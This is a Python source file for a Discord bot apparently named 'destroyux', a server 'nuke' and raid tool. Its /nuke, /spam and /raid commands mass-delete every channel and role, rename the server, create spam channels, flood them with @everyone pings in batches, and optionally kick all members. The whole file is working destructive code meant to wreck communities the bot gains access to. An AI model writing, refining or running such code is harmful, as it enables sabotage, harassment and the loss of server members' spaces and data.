# main.py
import discord
from discord.ext import commands, tasks
import asyncio
import os
from dotenv import load_dotenv
from typing import Optional
import json

load_dotenv()

intents = discord.Intents.default()
intents.message_content = True
intents.members = True
intents.guilds = True

bot = commands.Bot(command_prefix="/", intents=intents)

# Configuration
CONFIG = {
    "ping_message": "DESTROYED BY DESTROYUX",
    "channel_prefix": "destroyed-",
    "server_name": "NUKED BY DESTROYUX",
    "spam_delay": 0.05,
    "max_pings_per_message": 100,
    "batch_size": 50
}

class NukeBot(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.active_operations = {}
    
    @discord.app_commands.command(name="nuke", description="Nuke the entire server")
    @discord.app_commands.describe(
        channels_name="Custom channel name prefix",
        server_name="Custom server name"
    )
    async def nuke(self, interaction: discord.Interaction, 
                   channels_name: Optional[str] = None,
                   server_name: Optional[str] = None):
        """Complete server nuke - channels, roles, permissions"""
        
        if not interaction.user.id == int(os.getenv("OWNER_ID", "0")):
            await interaction.response.send_message("Unauthorized", ephemeral=True)
            return
        
        await interaction.response.defer()
        guild = interaction.guild
        channel_name = channels_name or CONFIG["channel_prefix"]
        srv_name = server_name or CONFIG["server_name"]
        
        deleted_channels = 0
        deleted_roles = 0
        
        # Delete all channels
        tasks_list = []
        for channel in guild.channels:
            tasks_list.append(self._safe_delete(channel))
            if len(tasks_list) >= CONFIG["batch_size"]:
                results = await asyncio.gather(*tasks_list, return_exceptions=True)
                deleted_channels += sum(1 for r in results if r)
                tasks_list = []
                await asyncio.sleep(0.1)
        
        if tasks_list:
            results = await asyncio.gather(*tasks_list, return_exceptions=True)
            deleted_channels += sum(1 for r in results if r)
        
        # Delete all roles
        tasks_list = []
        for role in guild.roles:
            if role.name != "@everyone":
                tasks_list.append(self._safe_delete_role(role))
                if len(tasks_list) >= CONFIG["batch_size"]:
                    results = await asyncio.gather(*tasks_list, return_exceptions=True)
                    deleted_roles += sum(1 for r in results if r)
                    tasks_list = []
                    await asyncio.sleep(0.1)
        
        if tasks_list:
            results = await asyncio.gather(*tasks_list, return_exceptions=True)
            deleted_roles += sum(1 for r in results if r)
        
        # Change server name
        try:
            await guild.edit(name=srv_name)
        except:
            pass
        
        # Create spam channels
        for i in range(20):
            try:
                ch = await guild.create_text_channel(f"{channel_name}{i}")
            except:
                pass
        
        await interaction.followup.send(f"✓ Nuked: {deleted_channels} channels, {deleted_roles} roles deleted")
    
    @discord.app_commands.command(name="spam", description="Spam messages across all channels")
    @discord.app_commands.describe(
        count="Number of messages per channel",
        message="Message to spam",
        ping_everyone="Ping @everyone in each message"
    )
    async def spam(self, interaction: discord.Interaction,
                   count: int = 100,
                   message: Optional[str] = None,
                   ping_everyone: bool = False):
        """High-speed spam across all channels"""
        
        if not interaction.user.id == int(os.getenv("OWNER_ID", "0")):
            await interaction.response.send_message("Unauthorized", ephemeral=True)
            return
        
        await interaction.response.defer()
        guild = interaction.guild
        msg = message or CONFIG["ping_message"]
        spam_msg = f"@everyone {msg}" if ping_everyone else msg
        
        channels = [ch for ch in guild.text_channels 
                   if ch.permissions_for(guild.me).send_messages]
        
        total_sent = 0
        
        for channel in channels:
            tasks_list = []
            for _ in range(count):
                tasks_list.append(self._safe_send(channel, spam_msg))
                if len(tasks_list) >= CONFIG["batch_size"]:
                    results = await asyncio.gather(*tasks_list, return_exceptions=True)
                    total_sent += sum(1 for r in results if r)
                    tasks_list = []
                    await asyncio.sleep(CONFIG["spam_delay"])
            
            if tasks_list:
                results = await asyncio.gather(*tasks_list, return_exceptions=True)
                total_sent += sum(1 for r in results if r)
        
        await interaction.followup.send(f"✓ Sent {total_sent} messages across {len(channels)} channels")
    
    @discord.app_commands.command(name="raid", description="Full server raid - nuke + spam + chaos")
    @discord.app_commands.describe(
        ping_count="Number of pings per message (max 5000)",
        spam_count="Number of spam messages",
        server_name="Custom server name",
        chaos="Enable additional chaos operations"
    )
    async def raid(self, interaction: discord.Interaction,
                   ping_count: int = 100,
                   spam_count: int = 50,
                   server_name: Optional[str] = None,
                   chaos: bool = False):
        """Complete raid sequence"""
        
        if not interaction.user.id == int(os.getenv("OWNER_ID", "0")):
            await interaction.response.send_message("Unauthorized", ephemeral=True)
            return
        
        await interaction.response.defer()
        guild = interaction.guild
        
        # Clamp ping_count to 5000
        ping_count = min(ping_count, 5000)
        srv_name = server_name or CONFIG["server_name"]
        
        # Step 1: Delete channels
        del_channels = 0
        tasks_list = []
        for channel in guild.channels:
            tasks_list.append(self._safe_delete(channel))
            if len(tasks_list) >= CONFIG["batch_size"]:
                results = await asyncio.gather(*tasks_list, return_exceptions=True)
                del_channels += sum(1 for r in results if r)
                tasks_list = []
        if tasks_list:
            results = await asyncio.gather(*tasks_list, return_exceptions=True)
            del_channels += sum(1 for r in results if r)
        
        # Step 2: Delete roles
        del_roles = 0
        tasks_list = []
        for role in guild.roles:
            if role.name != "@everyone":
                tasks_list.append(self._safe_delete_role(role))
                if len(tasks_list) >= CONFIG["batch_size"]:
                    results = await asyncio.gather(*tasks_list, return_exceptions=True)
                    del_roles += sum(1 for r in results if r)
                    tasks_list = []
        if tasks_list:
            results = await asyncio.gather(*tasks_list, return_exceptions=True)
            del_roles += sum(1 for r in results if r)
        
        # Step 3: Change server name
        try:
            await guild.edit(name=srv_name)
        except:
            pass
        
        # Step 4: Create chaos channels and spam
        total_spam = 0
        for i in range(10):
            try:
                ch = await guild.create_text_channel(f"destroyed-{i}")
                
                # Build ping message (up to 5000 mentions)
                ping_msg = "@everyone " + " ".join(["@everyone"] * (ping_count // 100))
                
                tasks_list = []
                for _ in range(spam_count):
                    tasks_list.append(self._safe_send(ch, ping_msg))
                    if len(tasks_list) >= CONFIG["batch_size"]:
                        results = await asyncio.gather(*tasks_list, return_exceptions=True)
                        total_spam += sum(1 for r in results if r)
                        tasks_list = []
                        await asyncio.sleep(0.05)
                
                if tasks_list:
                    results = await asyncio.gather(*tasks_list, return_exceptions=True)
                    total_spam += sum(1 for r in results if r)
            except:
                pass
        
        # Step 5: Optional chaos
        if chaos:
            # Kick all members
            kicked = 0
            async for member in guild.fetch_members(limit=None):
                if member != interaction.user and member != guild.owner:
                    try:
                        await member.kick()
                        kicked += 1
                    except:
                        pass
                    await asyncio.sleep(0.1)
            
            await interaction.followup.send(f"✓ Raid complete: {del_channels} channels deleted, {del_roles} roles deleted, {total_spam} spam messages, {kicked} members kicked")
        else:
            await interaction.followup.send(f"✓ Raid complete: {del_channels} channels deleted, {del_roles} roles deleted, {total_spam} spam messages")
    
    async def _safe_delete(self, channel):
        try:
            await channel.delete()
            return True
        except:
            return False
    
    async def _safe_delete_role(self, role):
        try:
            await role.delete()
            return True
        except:
            return False
    
    async def _safe_send(self, channel, message):
        try:
            await channel.send(message)
            return True
        except:
            return False

@bot.event
async def on_ready():
    print(f"[+] destroyux online as {bot.user}")
    try:
        synced = await bot.tree.sync()
        print(f"[+] Synced {len(synced)} commands")
    except Exception as e:
        print(f"[-] Sync error: {e}")
    
    # Set watching status
    await bot.change_presence(
        activity=discord.Activity(
            type=discord.ActivityType.watching,
            name="servers burn | .gg/m3oza"
        )
    )

async def main():
    async with bot:
        await bot.add_cog(NukeBot(bot))
        await bot.start(os.getenv("BOT_TOKEN"))

if __name__ == "__main__":
    asyncio.run(main())
